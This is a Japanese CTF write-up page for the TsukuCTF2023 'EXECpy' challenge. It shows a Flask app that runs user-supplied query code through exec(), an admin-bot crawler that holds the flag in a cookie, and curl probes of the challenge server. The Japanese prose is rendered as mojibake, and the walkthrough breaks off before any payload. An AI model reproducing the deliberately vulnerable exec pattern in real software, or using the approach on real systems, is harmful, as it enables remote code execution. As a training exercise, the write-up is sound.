<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>EXECpy-TsukuCTF2023</title><meta name="description" content="ã“ã®ã‚µã‚¤ãƒˆã¯SecHack365ä¿®äº†ç”Ÿã‚ˆã£ã¦é‹å–¶ã•ã‚Œã¦ã„ã‚‹éå…¬å¼ã®ã®ãƒ•ã‚¡ãƒ³ãƒšãƒ¼ã‚¸ã§ã™ã€‚"/><link rel="icon" href="/favicon.ico"/><meta name="og:title" content="EXECpy-TsukuCTF2023"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta property="og:image" content="https://fans.sechack365.com/images/tsukuctf-logo.png"/><meta name="next-head-count" content="9"/><link rel="preload" href="/_next/static/css/21f8e083f97816c3.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/21f8e083f97816c3.css" crossorigin="" data-n-g=""/><link rel="preload" href="/_next/static/css/ffca696ef8ef2fa4.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/ffca696ef8ef2fa4.css" crossorigin="" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-0e0f1e223ab60438.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/framework-10fac88913917d91.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/main-3ae351249979994e.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/_app-7ede516a3bfbb4df.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/1bfc9850-950c562bd9f4b960.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/147-d128eadc2dac4c62.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/212-7f8e90692937549a.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/ctf/TsukuCTF2023/%5Bid%5D-6f480ec18f116827.js" defer="" crossorigin=""></script><script src="/_next/static/0Onlp1ZUa7LUgmSD0AeGE/_buildManifest.js" defer="" crossorigin=""></script><script src="/_next/static/0Onlp1ZUa7LUgmSD0AeGE/_ssgManifest.js" defer="" crossorigin=""></script></head><body><div id="__next"><div><div class="x1aogm5o xvqvw8y xudrmeu x78zum5 x1q0g3np x6s0dn4"><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq xxzecl9 x117nqv4 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/">TOP</a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/blog">å‚åŠ è¨˜</a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/timer">â€ ç· åˆ‡é§†å‹•ã‚³ãƒ¼ã‚¹â€ </a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/ctf">TsukuCTF</a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="https://github.com/SecHack365-Fans/SecHack365-Fans.github.io"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></div><div style="padding:15px"><h1>EXECpy</h1>
<h2>å•é¡Œæ–‡</h2>
<p>RCEã‹ã‚™ã‚ã‚“ã¨ã‚™ãã•ã„?<br/>
<!-- -->ãƒ†ã‚™ãƒ¼ã‚¿ã‚’<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">exec</code>ã«æ¸¡ã—ã¨ã„ãŸã‹ã‚‰RCE2XSSã—ã¦ã­!</p>
<p><a href="http://118.27.109.12:31416">http://118.27.109.12:31416</a></p>
<p><strong>AdminBot:</strong> <a href="http://118.27.109.12:31416/crawler">http://118.27.109.12:31416/crawler</a></p>
<p>Hint<br/>
<!-- -->wowwow</p>
<h2>é›£æ˜“åº¦</h2>
<p><strong>hard</strong></p>
<h2>ä½œå•ã«ã‚ãŸã£ã¦</h2>
<p>DEF CON 31ã§å°ã•ãé–‹å‚¬ã•ã‚Œã¦ã„ãŸSpaceX Security Challengeã«potetisenseiã¨å‡ºãŸéš›ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’XSSã«è½ã¨ã—è¾¼ã¿ã¾ã—ãŸã€‚<br/>
<!-- -->pickleã§RCEãŒã§ãã‚‹ã‚·ãƒŠãƒªã‚ªã§ã‚µãƒ¼ãƒå†…éƒ¨ã®ãƒã‚¤ãƒŠãƒªã‚’å–å¾—ã™ã‚‹å¿…è¦ãŒã‚ã£ãŸã®ã§ã™ãŒã€ã‚¢ã‚¦ãƒˆãƒã‚¦ãƒ³ãƒ‰é€šä¿¡ã‚„å¿œç­”æ™‚é–“ã§ã®ã‚ªãƒ©ã‚¯ãƒ«ãŒã§ããªã„(å…±ã«é‹å–¶ã‚¤ãƒ³ãƒ•ãƒ©ã®å•é¡Œ)çŠ¶æ³ã§ã—ãŸã€‚<br/>
<!-- -->ãã“ã§é–‹ã„ã¦ã„ã‚‹fdã«å–å¾—ã—ãŸã„ãƒ‡ãƒ¼ã‚¿ã‚’æµã—è¾¼ã‚“ã§HTTPå¿œç­”ã¨ã—ã¦è¿”ã™ã“ã¨ã§ã€å…¥æ‰‹ã™ã‚‹æ‰‹æ³•ã‚’ç”¨ã„ã¦ã„ã¾ã—ãŸã€‚<br/>
<!-- -->ç¾å®Ÿã§ã¯XSS2RCEã¯æœ€é«˜ã§ã™ãŒã€RCE2XSSã¯ã†ã‚Œã—ããªã„ã§ã™ã€‚</p>
<h2>è§£æ³•</h2>
<p>URLã€AdminBotã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒæ¸¡ã•ã‚Œã‚‹ã€‚<br/>
<!-- -->ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨Pythonã®execã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹è¬ã®ã‚µãƒ¼ãƒ“ã‚¹ã ã€‚<br/>
<img src="https://raw.githubusercontent.com/SecHack365-Fans/SecHack365-Fans.github.io/master/pages/ctf/TsukuCTF2023/writeups/EXECpy/images/site1.png" alt="site1.png" style="width:80%"/><br/>
<!-- -->ãŸã ã—å®Ÿè¡Œçµæœã¯è¿”ã—ã¦ãã‚Œãªã„ã€‚<br/>
<img src="https://raw.githubusercontent.com/SecHack365-Fans/SecHack365-Fans.github.io/master/pages/ctf/TsukuCTF2023/writeups/EXECpy/images/site2.png" alt="site2.png" style="width:80%"/><br/>
<!-- -->URLã¯<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">http://118.27.109.12:31416/?code=print%281%29</code>ã§ã‚ã‚Šã€ã‚³ãƒ¼ãƒ‰ã‚’ã‚¯ã‚¨ãƒªã«æ¸¡ã›ã‚‹ã€‚<br/>
<!-- -->AdminBotãŒã‚ã‚‹ã“ã¨ã‹ã‚‰ã‚‚XSSå•é¡Œã ã‚ã†ã€‚<br/>
<img src="https://raw.githubusercontent.com/SecHack365-Fans/SecHack365-Fans.github.io/master/pages/ctf/TsukuCTF2023/writeups/EXECpy/images/site3.png" alt="site3.png" style="width:80%"/><br/>
<!-- -->ã‚½ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã¨ãƒ¡ã‚¤ãƒ³ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã‚ã£ãŸã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#cc99cd">from</span><span> flask </span><span class="token token" style="color:#cc99cd">import</span><span> Flask</span><span class="token token" style="color:#ccc">,</span><span> render_template</span><span class="token token" style="color:#ccc">,</span><span> request
</span>
<span>app </span><span class="token token" style="color:#67cdcc">=</span><span> Flask</span><span class="token token" style="color:#ccc">(</span><span>__name__</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<!-- -->
<span></span><span class="token token decorator annotation" style="color:#ccc">@app</span><span class="token token decorator annotation" style="color:#ccc">.</span><span class="token token decorator annotation" style="color:#ccc">route</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;/&quot;</span><span class="token token" style="color:#ccc">,</span><span> methods</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;GET&quot;</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">index</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    code </span><span class="token token" style="color:#67cdcc">=</span><span> request</span><span class="token token" style="color:#ccc">.</span><span>args</span><span class="token token" style="color:#ccc">.</span><span>get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;code&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">not</span><span> code</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">return</span><span> render_template</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;index.html&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>    </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">exec</span><span class="token token" style="color:#ccc">(</span><span>code</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">except</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">pass</span><span>
</span>
<span>    </span><span class="token token" style="color:#cc99cd">return</span><span> render_template</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;result.html&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<!-- -->
<span></span><span class="token token" style="color:#cc99cd">if</span><span> __name__ </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#7ec699">&quot;__main__&quot;</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    app</span><span class="token token" style="color:#ccc">.</span><span>run</span><span class="token token" style="color:#ccc">(</span><span>debug</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">True</span><span class="token token" style="color:#ccc">,</span><span> host</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&quot;0.0.0.0&quot;</span><span class="token token" style="color:#ccc">,</span><span> port</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">31416</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>ã‚¯ãƒ­ãƒ¼ãƒ©ãƒ¼ã‚‚è¦‹ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ã€Playwrightã§cookieã«ãƒ•ãƒ©ã‚°ã‚’ä»˜ã‘ã¦ãƒ¦ãƒ¼ã‚¶ã®å…¥åŠ›URLã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ã€‚<br/>
<!-- -->ãŸã ã—ã€ãƒ•ãƒ©ã‚°ãŒä»˜ããŸã‚ã«ã¯<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">if (&quot;Tsukushi/2.94&quot; in header) and (&quot;ğŸ¤ª&quot; not in content):</code>ã®åˆ¶é™ãŒã‚ã‚‹ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#cc99cd">import</span><span> os
</span><span></span><span class="token token" style="color:#cc99cd">import</span><span> asyncio
</span><span></span><span class="token token" style="color:#cc99cd">from</span><span> playwright</span><span class="token token" style="color:#ccc">.</span><span>async_api </span><span class="token token" style="color:#cc99cd">import</span><span> async_playwright
</span><span></span><span class="token token" style="color:#cc99cd">from</span><span> flask </span><span class="token token" style="color:#cc99cd">import</span><span> Flask</span><span class="token token" style="color:#ccc">,</span><span> render_template</span><span class="token token" style="color:#ccc">,</span><span> request
</span>
<span>app </span><span class="token token" style="color:#67cdcc">=</span><span> Flask</span><span class="token token" style="color:#ccc">(</span><span>__name__</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>DOMAIN </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;nginx&quot;</span><span>
</span><span>FLAG </span><span class="token token" style="color:#67cdcc">=</span><span> os</span><span class="token token" style="color:#ccc">.</span><span>environ</span><span class="token token" style="color:#ccc">.</span><span>get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;FLAG&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;TsukuCTF23{**********REDACTED**********}&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<!-- -->
<span></span><span class="token token decorator annotation" style="color:#ccc">@app</span><span class="token token decorator annotation" style="color:#ccc">.</span><span class="token token decorator annotation" style="color:#ccc">route</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;/crawler&quot;</span><span class="token token" style="color:#ccc">,</span><span> methods</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;GET&quot;</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">index_get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">return</span><span> render_template</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;index_get.html&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<!-- -->
<span></span><span class="token token" style="color:#cc99cd">async</span><span> </span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">crawl</span><span class="token token" style="color:#ccc">(</span><span>url</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">async</span><span> </span><span class="token token" style="color:#cc99cd">with</span><span> async_playwright</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> p</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        browser </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">await</span><span> p</span><span class="token token" style="color:#ccc">.</span><span>chromium</span><span class="token token" style="color:#ccc">.</span><span>launch</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        page </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">await</span><span> browser</span><span class="token token" style="color:#ccc">.</span><span>new_page</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>        </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            response </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">await</span><span> page</span><span class="token token" style="color:#ccc">.</span><span>goto</span><span class="token token" style="color:#ccc">(</span><span>url</span><span class="token token" style="color:#ccc">,</span><span> timeout</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">5000</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            header </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">await</span><span> response</span><span class="token token" style="color:#ccc">.</span><span>header_value</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;Server&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            content </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">await</span><span> page</span><span class="token token" style="color:#ccc">.</span><span>content</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>            </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;Tsukushi/2.94&quot;</span><span> </span><span class="token token" style="color:#cc99cd">in</span><span> header</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">and</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;ğŸ¤ª&quot;</span><span> </span><span class="token token" style="color:#cc99cd">not</span><span> </span><span class="token token" style="color:#cc99cd">in</span><span> content</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>                </span><span class="token token" style="color:#cc99cd">await</span><span> page</span><span class="token token" style="color:#ccc">.</span><span>context</span><span class="token token" style="color:#ccc">.</span><span>add_cookies</span><span class="token token" style="color:#ccc">(</span><span>
</span><span>                    </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#7ec699">&quot;FLAG&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;value&quot;</span><span class="token token" style="color:#ccc">:</span><span> FLAG</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;domain&quot;</span><span class="token token" style="color:#ccc">:</span><span> DOMAIN</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;path&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#7ec699">&quot;/&quot;</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">]</span><span>
</span><span>                </span><span class="token token" style="color:#ccc">)</span><span>
</span><span>                </span><span class="token token" style="color:#cc99cd">if</span><span> url</span><span class="token token" style="color:#ccc">.</span><span>startswith</span><span class="token token" style="color:#ccc">(</span><span class="token token string-interpolation" style="color:#7ec699">f&quot;http://</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">DOMAIN</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">/?code=&quot;</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">or</span><span> url</span><span class="token token" style="color:#ccc">.</span><span>startswith</span><span class="token token" style="color:#ccc">(</span><span>
</span><span>                    </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;https://</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">DOMAIN</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">/?code=&quot;</span><span>
</span><span>                </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>                    </span><span class="token token" style="color:#cc99cd">await</span><span> page</span><span class="token token" style="color:#ccc">.</span><span>goto</span><span class="token token" style="color:#ccc">(</span><span>url</span><span class="token token" style="color:#ccc">,</span><span> timeout</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">5000</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">except</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            </span><span class="token token" style="color:#cc99cd">pass</span><span>
</span>
<span>        </span><span class="token token" style="color:#cc99cd">await</span><span> browser</span><span class="token token" style="color:#ccc">.</span><span>close</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<!-- -->
<span></span><span class="token token decorator annotation" style="color:#ccc">@app</span><span class="token token decorator annotation" style="color:#ccc">.</span><span class="token token decorator annotation" style="color:#ccc">route</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;/crawler&quot;</span><span class="token token" style="color:#ccc">,</span><span> methods</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;POST&quot;</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">index_post</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    asyncio</span><span class="token token" style="color:#ccc">.</span><span>run</span><span class="token token" style="color:#ccc">(</span><span>
</span><span>        crawl</span><span class="token token" style="color:#ccc">(</span><span>
</span><span>            request</span><span class="token token" style="color:#ccc">.</span><span>form</span><span class="token token" style="color:#ccc">.</span><span>get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span>replace</span><span class="token token" style="color:#ccc">(</span><span>
</span><span>                </span><span class="token token" style="color:#7ec699">&quot;http://localhost:31416/&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;http://</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">DOMAIN</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">/&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">1</span><span>
</span><span>            </span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">return</span><span> render_template</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;index_post.html&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<!-- -->
<span></span><span class="token token" style="color:#cc99cd">if</span><span> __name__ </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#7ec699">&quot;__main__&quot;</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    app</span><span class="token token" style="color:#ccc">.</span><span>run</span><span class="token token" style="color:#ccc">(</span><span>debug</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">True</span><span class="token token" style="color:#ccc">,</span><span> host</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&quot;0.0.0.0&quot;</span><span class="token token" style="color:#ccc">,</span><span> port</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">31417</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>ã‚‚ã†ä¸€åº¦ãƒ¡ã‚¤ãƒ³ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å¿œç­”ã‚’ç¢ºèªã™ã‚‹ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">curl</span><span> </span><span class="token token" style="color:#7ec699">&#x27;http://118.27.109.12:31416/?code=print%281%29&#x27;</span><span> -I
</span><span>HTTP/1.1 </span><span class="token token" style="color:#f08d49">200</span><span> OK
</span>Server: nginx/1.25.3
<span>Date: Sat, 09 Dec </span><span class="token token" style="color:#f08d49">2023</span><span> 00:00:00 GMT
</span><span>Content-Type: text/html</span><span class="token token" style="color:#ccc">;</span><span> </span><span class="token token assign-left" style="color:#7ec699">charset</span><span class="token token" style="color:#67cdcc">=</span><span>utf-8
</span><span>Content-Length: </span><span class="token token" style="color:#f08d49">1059</span><span>
</span>Connection: close
<!-- -->
<span>$ </span><span class="token token" style="color:#f08d49">curl</span><span> </span><span class="token token" style="color:#7ec699">&#x27;http://118.27.109.12:31416/?code=print%281%29&#x27;</span><span>
</span>~~
